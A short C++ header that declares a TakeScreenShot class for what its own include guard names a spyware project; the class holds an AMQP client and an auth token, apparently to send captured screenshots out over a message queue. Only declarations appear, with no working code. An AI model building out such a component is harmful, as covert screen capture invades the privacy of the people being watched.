#include "../amqp/AmqpClient.hpp"

#ifndef _SPYWARE_SCREENSHOT_HPP_
#define _SPYWARE_SCREENSHOT_HPP_ 1
#define _SPYWARE_SCREESHORT_MESSAGE_SIZE 400 * 1024 // 400kb

class TakeScreenShot {
    private :
        AmqpClient* amqpClient;
        std::string authToken;

    public :
        TakeScreenShot(AmqpClient*, std::string);
        void operator()(unsigned);

    private :
        void ScreenShot();
};
#endif